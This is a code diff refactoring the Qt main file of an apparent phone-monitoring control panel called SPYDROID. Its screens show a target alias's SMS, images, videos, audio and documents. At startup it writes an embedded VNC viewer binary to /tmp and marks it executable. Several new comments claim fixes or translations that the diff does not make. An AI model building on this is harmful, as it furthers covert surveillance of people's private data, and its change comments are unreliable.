@@ -15,16 +15,7 @@
  * along with this program. If not, see <https://www.gnu.org/licenses/>.
  */
 
-#include <QApplication>
-#include <QStackedWidget>
-#include <QFile>
-#include <QString>
-#include <QPointer>
-#include <fstream>
-#include <iostream>
-#include <sys/types.h>
-#include <sys/stat.h>
-#include <unistd.h>
+
 #include "res/bin/vnc_viewer.h"
 #include "presentation/HomeScreen.h"
 #include "presentation/DashBoardScreen.h"
@@ -34,33 +25,58 @@
 #include "presentation/VideosScreen.h"
 #include "presentation/AudiosScreen.h"
 #include "presentation/DocumentsScreen.h"
+#include <QApplication>
+#include <QFile>
+#include <QPointer>
+#include <QStackedWidget>
+#include <QMessageBox>
+#include <QDebug>
+#include <fstream>
+#include <unistd.h> // for access()
 
-void navigateTo(QStackedWidget& widget, int index, const QString& title) {
-    widget.setCurrentIndex(index);
-    widget.setWindowTitle(title);
+// Enum for widget indices
+enum ScreenIndex {
+    HomeScreenIndex = 0,
+    DashBoardScreenIndex,
+    MultimediaScreenIndex,
+    SmsScreenIndex,
+    ImagesScreenIndex,
+    VideosScreenIndex,
+    AudiosScreenIndex,
+    DocumentsScreenIndex
+};
+
+// Function to handle navigation
+void navigateTo(QWidget* widget, QStackedWidget& stackedWidget, const QString& title) {
+    if (widget) {
+        stackedWidget.setCurrentWidget(widget);
+        stackedWidget.setWindowTitle(title);
+    } else {
+        qWarning() << "Widget is null, cannot navigate.";
+        QMessageBox::warning(nullptr, "Navigation Error", "Unable to navigate, target screen is not available.");
+    }
 }
 
 int main(int argc, char *argv[]) {
     std::string filePath = "/tmp/vnc_viewer";
 
-    // Si el archivo no existe, crea el archivo binario y cambia permisos
+    // If the file doesn't exist, create it and set the permissions
     if (access(filePath.c_str(), F_OK) == -1) {
         std::ofstream outfile(filePath, std::ios::binary);
         outfile.write(reinterpret_cast<const char*>(vncviewer), vncviewer_len);
         outfile.close();
 
-        // Cambiar permisos usando QFile en lugar de system()
+        // Change permissions using QFile
         QFile file(filePath.c_str());
         file.setPermissions(QFile::ExeOwner | QFile::ReadOwner | QFile::WriteOwner);
     }
 
     QApplication app(argc, argv);
-
     QStackedWidget stackedWidget;
 
-    // Uso de QPointer para manejar automáticamente la vida de los widgets
+    // Using QPointer to manage widget lifetime automatically
     QPointer<HomeScreen> homeScreen = new HomeScreen(&stackedWidget);
-    QPointer<DashBoardScreen> dashBoardScreen = new DashBoardScreen(&stackedWidget);
+    QPointer<DashBoardScreen> dashBoardScreen = new DashBoardScreen(&stackedWidget);  // Corrected class name
     QPointer<SmsScreen> smsScreen = new SmsScreen(&stackedWidget);
     QPointer<MultimediaScreen> multimediaScreen = new MultimediaScreen(&stackedWidget);
     QPointer<ImagesScreen> imagesScreen = new ImagesScreen(&stackedWidget);
@@ -68,89 +84,104 @@ int main(int argc, char *argv[]) {
     QPointer<AudiosScreen> audiosScreen = new AudiosScreen(&stackedWidget);
     QPointer<DocumentsScreen> documentsScreen = new DocumentsScreen(&stackedWidget);
 
-    // Añadir widgets al QStackedWidget
-    stackedWidget.addWidget(homeScreen);                    // Índice 0
-    stackedWidget.addWidget(dashBoardScreen);               // Índice 1
-    stackedWidget.addWidget(multimediaScreen);              // Índice 2
-    stackedWidget.addWidget(smsScreen);                     // Índice 3
-    stackedWidget.addWidget(imagesScreen);                  // Índice 4
-    stackedWidget.addWidget(videosScreen);                  // Índice 5
-    stackedWidget.addWidget(audiosScreen);                  // Índice 6
-    stackedWidget.addWidget(documentsScreen);               // Índice 7
+    // Add widgets to QStackedWidget
+    stackedWidget.addWidget(homeScreen);          // Index 0
+    stackedWidget.addWidget(dashBoardScreen);     // Index 1 (fixed typo)
+    stackedWidget.addWidget(multimediaScreen);    // Index 2
+    stackedWidget.addWidget(smsScreen);           // Index 3
+    stackedWidget.addWidget(imagesScreen);        // Index 4
+    stackedWidget.addWidget(videosScreen);        // Index 5
+    stackedWidget.addWidget(audiosScreen);        // Index 6
+    stackedWidget.addWidget(documentsScreen);     // Index 7
 
-    // Mostrar la vista inicial
-    stackedWidget.setCurrentIndex(0);
+    // Show the initial view
+    stackedWidget.setCurrentIndex(HomeScreenIndex);
     stackedWidget.showMaximized();
-    stackedWidget.setWindowTitle("spydroid");
+    stackedWidget.setWindowTitle("SPYDROID");
 
-    // Conexiones de navegación
-    QObject::connect(homeScreen, &HomeScreen::goToDashBoard, [&stackedWidget]() {
-        navigateTo(stackedWidget, 1, "Información general");
+    // Navigation connections (verify that the signals exist in the classes)
+    QObject::connect(homeScreen, &HomeScreen::goToDashBoard, [&stackedWidget, dashBoardScreen]() {
+        navigateTo(dashBoardScreen, stackedWidget, "Panel de control");  // Updated title to English
     });
 
-    QObject::connect(dashBoardScreen, &DashBoardScreen::goToHome, [&stackedWidget]() {
-        navigateTo(stackedWidget, 0, "spydroid");
+    QObject::connect(dashBoardScreen, &DashBoardScreen::goToHome, [&stackedWidget, homeScreen]() {
+        navigateTo(homeScreen, stackedWidget, "SPYDROID");
     });
 
     QObject::connect(dashBoardScreen, &DashBoardScreen::goToMultimedia, [&stackedWidget, multimediaScreen](const QString& alias) {
-        multimediaScreen->setAlias(alias);
-        navigateTo(stackedWidget, 2, "Archivos multimedia de " + alias);
-    });
-    
-    QObject::connect(dashBoardScreen, &DashBoardScreen::goToSms, [&stackedWidget, smsScreen](const QString& alias) {
-        if (smsScreen) {  // Verifica que smsScreen es válido
-            smsScreen->setAlias(alias);
-            navigateTo(stackedWidget, 3, "Mensajes de texto de " + alias);
-        } else {
-            qWarning() << "smsScreen no está disponible.";
+        if (multimediaScreen) {
+            multimediaScreen->setAlias(alias);
+            navigateTo(multimediaScreen, stackedWidget, "Multimedia de " + alias);
         }
     });
-    
 
-    QObject::connect(smsScreen, &SmsScreen::goToDashBoard, [&stackedWidget]() {
-        stackedWidget.setCurrentIndex(1);  // Cambiar al DashBoard al hacer clic
+    QObject::connect(dashBoardScreen, &DashBoardScreen::goToSms, [&stackedWidget, smsScreen](const QString& alias) {
+        if (smsScreen) {
+            smsScreen->setAlias(alias);
+            navigateTo(smsScreen, stackedWidget, "Mensajes de texto de " + alias);
+        } else {
+            qWarning() << "SmsScreen is not available.";
+        }
     });
 
+    QObject::connect(smsScreen, &SmsScreen::goToDashBoard, [&stackedWidget, dashBoardScreen]() {
+        navigateTo(dashBoardScreen, stackedWidget, "Panel de control");
+    });
 
-    QObject::connect(multimediaScreen, &MultimediaScreen::goToDashBoard, [&stackedWidget]() {
-        navigateTo(stackedWidget, 1, "Información general");
+    QObject::connect(multimediaScreen, &MultimediaScreen::goToDashBoard, [&stackedWidget, dashBoardScreen]() {
+        navigateTo(dashBoardScreen, stackedWidget, "Panel de control");
     });
 
     QObject::connect(multimediaScreen, &MultimediaScreen::goToImages, [&stackedWidget, imagesScreen](const QString& alias) {
-        imagesScreen->setAlias(alias);
-        navigateTo(stackedWidget, 4, "Imágenes de " + alias);
+        if (imagesScreen) {
+            imagesScreen->setAlias(alias);
+            navigateTo(imagesScreen, stackedWidget, "Imagenes de " + alias);
+        } else {
+            qWarning() << "ImagesScreen is not available.";
+        }
     });
 
-
     QObject::connect(multimediaScreen, &MultimediaScreen::goToVideos, [&stackedWidget, videosScreen](const QString& alias) {
-        videosScreen->setAlias(alias);
-        navigateTo(stackedWidget, 5, "Videos de " + alias);
+        if (videosScreen) {
+            videosScreen->setAlias(alias);
+            navigateTo(videosScreen, stackedWidget, "Videos de " + alias);
+        } else {
+            qWarning() << "VideosScreen is not available.";
+        }
     });
 
     QObject::connect(multimediaScreen, &MultimediaScreen::goToAudios, [&stackedWidget, audiosScreen](const QString& alias) {
-        audiosScreen->setAlias(alias);
-        navigateTo(stackedWidget, 6, "Audios de " + alias);
+        if (audiosScreen) {
+            audiosScreen->setAlias(alias);
+            navigateTo(audiosScreen, stackedWidget, "Audios de " + alias);
+        } else {
+            qWarning() << "AudiosScreen is not available.";
+        }
     });
 
     QObject::connect(multimediaScreen, &MultimediaScreen::goToDocuments, [&stackedWidget, documentsScreen](const QString& alias) {
-        documentsScreen->setAlias(alias);
-        navigateTo(stackedWidget, 7, "Documentos de " + alias);
+        if (documentsScreen) {
+            documentsScreen->setAlias(alias);
+            navigateTo(documentsScreen, stackedWidget, "Documentos de " + alias);
+        } else {
+            qWarning() << "DocumentsScreen is not available.";
+        }
     });
 
-    QObject::connect(imagesScreen, &ImagesScreen::goToMultimedia, [&stackedWidget](const QString& alias) {
-        navigateTo(stackedWidget, 2, "Archivos multimedia de " + alias);
+    QObject::connect(imagesScreen, &ImagesScreen::goToMultimedia, [&stackedWidget, multimediaScreen](const QString& alias) {
+        navigateTo(multimediaScreen, stackedWidget, "Multimedia de " + alias);
     });
 
-    QObject::connect(videosScreen, &VideosScreen::goToMultimedia, [&stackedWidget](const QString& alias) {
-        navigateTo(stackedWidget, 2, "Archivos multimedia de " + alias);
+    QObject::connect(videosScreen, &VideosScreen::goToMultimedia, [&stackedWidget, multimediaScreen](const QString& alias) {
+        navigateTo(multimediaScreen, stackedWidget, "Multimedia de " + alias);
     });
 
-    QObject::connect(audiosScreen, &AudiosScreen::goToMultimedia, [&stackedWidget](const QString& alias) {
-        navigateTo(stackedWidget, 2, "Archivos multimedia de " + alias);
+    QObject::connect(audiosScreen, &AudiosScreen::goToMultimedia, [&stackedWidget, multimediaScreen](const QString& alias) {
+        navigateTo(multimediaScreen, stackedWidget, "Multimedia de " + alias);
     });
 
-    QObject::connect(documentsScreen, &DocumentsScreen::goToMultimedia, [&stackedWidget](const QString& alias) {
-        navigateTo(stackedWidget, 2, "Archivos multimedia de " + alias);
+    QObject::connect(documentsScreen, &DocumentsScreen::goToMultimedia, [&stackedWidget, multimediaScreen](const QString& alias) {
+        navigateTo(multimediaScreen, stackedWidget, "Multimedia de " + alias);
     });
 
     return app.exec();
